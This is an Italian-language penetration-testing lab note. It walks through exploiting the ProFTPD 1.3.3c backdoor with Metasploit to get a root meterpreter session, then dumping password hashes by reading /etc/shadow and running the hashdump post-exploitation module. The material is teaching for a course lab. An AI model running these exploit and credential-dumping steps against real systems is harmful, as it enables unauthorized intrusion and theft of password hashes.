# Dumping Linux Password Hashes

In Linux con l'hash delle password non possiamo farci molto se non craccarli per ottenere la password.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Come fare hash dump

### Identificare i servizi running sul target

```
nmap -sV 192.44.156.3
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Verificare se la versione di ProFTPD è vulnerabile

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Abbiamo il Backdoor Command Execution che possiamo usare

### Eseguire l'exploit

```
msfconsole
setg RHOSTS 192.44.156.3
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
show options
exploit
/bin/bash -i
id
CTRL+Z -> background session? Y
sessions
sessions -u 1 // ci dà un errore ma crea comunque la sessione con meterpreter
sessions
sessions 2
sysinfo
getuid //e vediamo che uid è 0 quindi quello di root)
cat /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Possiamo osservare che l'unico account sulla macchina che non sia un account di servizio è il root, e ci viene stampato a video l'algoritmo di hash $6$ quindi SHA-512, seguito dall'hash vero e proprio:

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Abbiamo quindi dumpato l'hash.

In un futuro corso vedremo come crackare gli hash per ottenere le password in chiaro.

### hashdump: Modulo MSF alternativo per dumpare hash password

```
msfconsole
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 2 //la sessione che abbiamo già attiva a seguito dell'exploitation del servizio ProFTPD
run
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Quello che questo modulo fa è identificare tutti gli utenti nel file /etc/shadow che hanno una password impostata e li salva in un file, in versione unshadowed (che ci verrà spiegato in un corso futuro sul password cracking cosa significa). In poche parole viene salvata la password in un formato che può essere craccato.
